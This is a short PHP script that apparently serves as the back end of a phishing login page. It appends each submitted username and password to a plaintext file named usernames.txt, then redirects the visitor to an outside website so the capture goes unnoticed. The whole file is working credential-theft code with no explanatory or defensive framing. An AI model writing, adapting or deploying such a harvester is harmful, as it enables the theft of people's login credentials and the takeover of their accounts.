<?php 
file_put_contents("usernames.txt", "\nUsername: " . $_POST['username'] . "\nPass: " . $_POST['Pass'] ."\n", FILE_APPEND);
header('Location: https://brsmm.com/?gad_source=1&gclid=Cj0KCQjw9vqyBhCKARIsAIIcLMH8HVwf1JMF4I0Y5n_L-Q24Jvqvz8-hSNEA9rd0rGcW6ue4w3JIeVEaAs8EEALw_wcB');
exit();
?>